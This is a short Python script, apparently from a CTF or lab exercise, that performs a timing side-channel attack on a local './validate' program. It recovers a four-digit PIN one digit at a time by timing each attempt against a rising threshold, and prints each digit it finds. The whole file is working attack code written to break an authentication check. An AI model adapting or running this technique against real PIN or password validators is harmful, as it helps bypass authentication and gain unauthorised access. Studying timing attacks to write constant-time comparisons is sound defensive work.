import time, subprocess

def timeSideChannelAttack():
    bekannterTeil = ""
    
    for i in range(4):
        for j in range(10):
            
            PIN = bekannterTeil + str(j) + "0" * (3-i)  

            startTime = time.perf_counter()

            result = subprocess.run(["./validate", PIN], capture_output=True)

            endTime = time.perf_counter()

            duration = endTime - startTime

            if result.returncode == 0:
                print(f"Found PIN: {PIN}")
                return
            
            schwellenwert = (i+1) * 0.1 + 0.05

            if duration > schwellenwert:
                bekannterTeil += str(j)
                print(f"Found digit: {bekannterTeil}")
                break 
    print("PIN nicht gefunden")


timeSideChannelAttack()
                



